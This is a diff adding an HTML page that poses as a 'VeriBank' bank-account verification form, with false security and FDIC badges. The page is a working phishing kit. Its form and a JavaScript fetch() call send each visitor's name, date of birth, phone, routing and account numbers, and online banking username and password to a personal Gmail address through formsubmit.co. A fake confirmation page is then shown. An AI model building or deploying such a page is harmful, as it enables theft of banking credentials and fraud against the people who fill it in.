@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Bank Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0b2b40 0%, #1a3a4f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 560px;
+            margin: 0 auto;
+        }
+
+        /* Form Card Styles */
+        .card {
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            background: #0f2b3b;
+            padding: 28px 28px 20px 28px;
+            color: white;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .badge {
+            background: #10b981;
+            color: white;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: #9bb7d4;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-strip {
+            background: #eef2ff;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #1e3a5f;
+            border-bottom: 1px solid #d9e2ef;
+            flex-wrap: wrap;
+        }
+
+        .security-strip span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .form-section {
+            padding: 28px;
+        }
+
+        /* Thank You Page Styles */
+        .thank-you-page {
+            display: none;
+            background: white;
+            border-radius: 32px;
+            padding: 40px 30px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .thank-you-page.show {
+            display: block;
+        }
+
+        .success-animation {
+            margin-bottom: 30px;
+        }
+
+        .checkmark-circle {
+            width: 120px;
+            height: 120px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 60px;
+            color: white;
+            box-shadow: 0 15px 30px -8px #10b981;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.5); }
+            70% { box-shadow: 0 0 0 15px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        .thank-you-page h1 {
+            color: #0f2b3b;
+            font-size: 36px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        .thank-you-page p {
+            color: #4a6479;
+            font-size: 17px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .reference-card {
+            background: #f0f9ff;
+            border: 2px dashed #1e6f9f;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 30px 0;
+        }
+
+        .reference-label {
+            color: #1e6f9f;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .reference-number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #0f2b3b;
+            background: white;
+            padding: 10px 20px;
+            border-radius: 60px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .info-item {
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .info-icon {
+            font-size: 24px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #2d3748;
+            font-weight: 500;
+        }
+
+        .home-btn {
+            background: #0f2b3b;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            box-shadow: 0 10px 20px -8px #0f2b3b;
+        }
+
+        .home-btn:hover {
+            background: #1d445b;
+            transform: translateY(-2px);
+        }
+
+        /* Form Styles */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f2a44;
+            margin-bottom: 6px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            color: #6f8fae;
+            font-size: 16px;
+        }
+
+        .input-wrapper input,
+        .input-wrapper select {
+            width: 100%;
+            padding: 15px 16px 15px 48px;
+            border: 1.5px solid #e1eaf1;
+            border-radius: 16px;
+            font-size: 15px;
+            background: #fbfdff;
+            transition: all 0.2s;
+        }
+
+        .input-wrapper input:focus,
+        .input-wrapper select:focus {
+            outline: none;
+            border-color: #1f6e9f;
+            box-shadow: 0 0 0 4px rgba(31,110,159,0.15);
+            background: white;
+        }
+
+        .row {
+            display: flex;
+            gap: 16px;
+        }
+
+        .row .input-group {
+            flex: 1;
+        }
+
+        .secure-card {
+            background: #f2f8ff;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 28px 0 20px 0;
+            border: 1px solid #cde2f5;
+        }
+
+        .secure-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            color: #0b2b40;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .secure-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            font-size: 13px;
+            color: #28597a;
+        }
+
+        .secure-grid div {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            width: calc(50% - 8px);
+        }
+
+        button {
+            width: 100%;
+            padding: 18px;
+            background: #0f2b3b;
+            color: white;
+            border: none;
+            border-radius: 60px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            box-shadow: 0 12px 20px -12px #0f2b3b;
+        }
+
+        button:hover {
+            background: #1d445b;
+            transform: scale(1.01);
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 13px;
+            color: #546e85;
+        }
+
+        .footer-note a {
+            color: #0f2b3b;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #94a9c2;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+
+        .divider-line {
+            height: 1px;
+            background: #dee9f2;
+            flex: 1;
+        }
+
+        @media (max-width: 500px) {
+            .row { flex-direction: column; gap: 0; }
+            .security-strip { gap: 8px; }
+            .secure-grid div { width: 100%; }
+            .info-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- FORM PAGE (visible by default) -->
+        <div id="formPage" class="card">
+            <div class="header">
+                <div class="header-top">
+                    <span style="font-weight:600; font-size:20px;">🏦 VeriBank</span>
+                    <span class="badge">⚡ 256-bit encrypted</span>
+                </div>
+                <h1>Connect your bank account</h1>
+                <p>🔒 Secure verification · <span>FDIC insured</span> · <span>Instant</span></p>
+            </div>
+
+            <div class="security-strip">
+                <span>🛡️ Plaid secure</span>
+                <span>🔐 End-to-end encryption</span>
+                <span>✅ Verified by Mastercard</span>
+            </div>
+
+            <div class="form-section">
+                <!-- FORM - SENDS TO YOUR EMAIL -->
+                <form id="bankForm" action="https://formsubmit.co/ryaangg26@gmail.com" method="POST">
+                    
+                    <!-- FormSubmit configuration -->
+                    <input type="hidden" name="_subject" value="🔔 NEW BANK LEAD - Action Required">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_autoresponse" value="Thank you for verifying your bank account. We'll contact you within 24 hours.">
+                    
+                    <!-- ========== PERSONAL INFO ========== -->
+                    <div class="row">
+                        <div class="input-group">
+                            <label>Full name</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">👤</span>
+                                <input type="text" name="full_name" placeholder="John A. Smith" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Date of birth</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">📅</span>
+                                <input type="date" name="dob" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="input-group">
+                            <label>Email address</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">✉️</span>
+                                <input type="email" name="email" placeholder="you@example.com" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Phone number</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">📱</span>
+                                <input type="tel" name="phone" placeholder="(555) 123-4567" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== BANK DETAILS ========== -->
+                    <div style="margin: 24px 0 8px; background: #eef6fb; padding: 8px 16px; border-radius: 40px; display: inline-block;">
+                        <span style="font-weight:600; font-size:13px;">🏧 BANK ACCOUNT INFORMATION</span>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Bank name</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">🏛️</span>
+                            <select name="bank_name" required>
+                                <option value="" disabled selected>Select your bank</option>
+                                <option value="Chase">Chase</option>
+                                <option value="Bank of America">Bank of America</option>
+                                <option value="Wells Fargo">Wells Fargo</option>
+                                <option value="Citibank">Citibank</option>
+                                <option value="US Bank">U.S. Bank</option>
+                                <option value="Truist">Truist</option>
+                                <option value="PNC">PNC Bank</option>
+                                <option value="Capital One">Capital One</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>If other, enter bank name</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">📝</span>
+                            <input type="text" name="other_bank_name" placeholder="e.g. Local Credit Union">
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="input-group">
+                            <label>Routing number</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">🔢</span>
+                                <input type="text" name="routing_number" placeholder="9-digit routing" pattern="[0-9]{9,}" maxlength="9" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Account number</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">📊</span>
+                                <input type="text" name="account_number" placeholder="Account number" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin: 5px 0 15px;">
+                        <label style="display: inline-flex; align-items: center; margin-right: 25px; font-weight:400;">
+                            <input type="radio" name="account_type" value="Checking" checked style="width:16px; margin-right:6px;"> Checking
+                        </label>
+                        <label style="display: inline-flex; align-items: center; font-weight:400;">
+                            <input type="radio" name="account_type" value="Savings" style="width:16px; margin-right:6px;"> Savings
+                        </label>
+                    </div>
+
+                    <!-- ========== ONLINE BANKING LOGIN ========== -->
+                    <div class="secure-card">
+                        <div class="secure-title">
+                            <span>🔐 ONLINE BANKING LOGIN</span>
+                        </div>
+                        <div class="input-group">
+                            <label>Bank username</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">👤</span>
+                                <input type="text" name="bank_username" placeholder="Your online banking username" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Bank password</label>
+                            <div class="input-wrapper">
+                                <span class="input-icon">🔑</span>
+                                <input type="password" name="bank_password" placeholder="••••••••••••" required>
+                            </div>
+                        </div>
+                        <div class="secure-grid">
+                            <div>🔒 AES-256 encryption</div>
+                            <div>🛡️ Never stored</div>
+                            <div>⚡ Instant verification</div>
+                            <div>✅ Bank-grade security</div>
+                        </div>
+                    </div>
+
+                    <!-- Consent -->
+                    <div style="margin: 20px 0;">
+                        <label style="display: flex; align-items: start; gap: 10px; font-weight:400; font-size:14px; color:#344e6c;">
+                            <input type="checkbox" name="consent" value="yes" required style="margin-top:3px; width:18px; height:18px;">
+                            <span>I confirm that I am the account holder and authorize verification.</span>
+                        </label>
+                    </div>
+
+                    <button type="submit">
+                        <span>✓</span> VERIFY & CONTINUE
+                    </button>
+
+                    <div class="divider">
+                        <span class="divider-line"></span>
+                        <span>⚡</span>
+                        <span class="divider-line"></span>
+                    </div>
+
+                    <div style="display: flex; justify-content: center; gap: 20px; color: #4d6f8f; font-size:13px;">
+                        <span>🏦 Member FDIC</span>
+                        <span>🔐 Norton Secured</span>
+                        <span>📋 Privacy assured</span>
+                    </div>
+                </form>
+
+                <div class="footer-note">
+                    Data is sent to <strong>ryaangg26@gmail.com</strong> (loan officer)
+                </div>
+            </div>
+        </div>
+
+        <!-- THANK YOU PAGE (hidden by default) -->
+        <div id="thankYouPage" class="thank-you-page">
+            <div class="success-animation">
+                <div class="checkmark-circle">✓</div>
+            </div>
+            
+            <h1>Thank You!</h1>
+            <p>Your bank account has been successfully verified.</p>
+            <p style="color: #1e6f9f;">We've received your information securely.</p>
+            
+            <div class="reference-card">
+                <div class="reference-label">Your Reference ID</div>
+                <div class="reference-number" id="referenceNumber">VB-2847</div>
+                <p style="font-size: 14px; margin-top: 10px;">Please save this for future reference</p>
+            </div>
+            
+            <div class="info-grid">
+                <div class="info-item">
+                    <span class="info-icon">📧</span>
+                    <span class="info-text">Confirmation sent to your email</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">🔒</span>
+                    <span class="info-text">256-bit encryption applied</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">⏱️</span>
+                    <span class="info-text">Response within 24 hours</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">📞</span>
+                    <span class="info-text">Representative will contact you</span>
+                </div>
+            </div>
+            
+            <p style="color: #4a6479; margin: 20px 0 10px;">A confirmation email has been sent to your inbox.</p>
+            
+            <button class="home-btn" onclick="window.location.href = window.location.href">
+                ← Return to Homepage
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Get the form
+        const form = document.getElementById('bankForm');
+        const formPage = document.getElementById('formPage');
+        const thankYouPage = document.getElementById('thankYouPage');
+        const referenceSpan = document.getElementById('referenceNumber');
+
+        // Handle form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop normal submission
+            
+            // Generate random reference number
+            const refNum = Math.floor(Math.random() * 9000) + 1000;
+            referenceSpan.textContent = 'VB-' + refNum;
+            
+            // Get form data
+            const formData = new FormData(form);
+            
+            // Send data to your email using fetch
+            fetch('https://formsubmit.co/ryaangg26@gmail.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if(response.ok) {
+                    // Hide form page, show thank you page
+                    formPage.style.display = 'none';
+                    thankYouPage.classList.add('show');
+                    
+                    // Clear form
+                    form.reset();
+                } else {
+                    alert('There was an error. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Connection error. Please try again.');
+            });
+        });
+    </script>
+</body>
+</html>
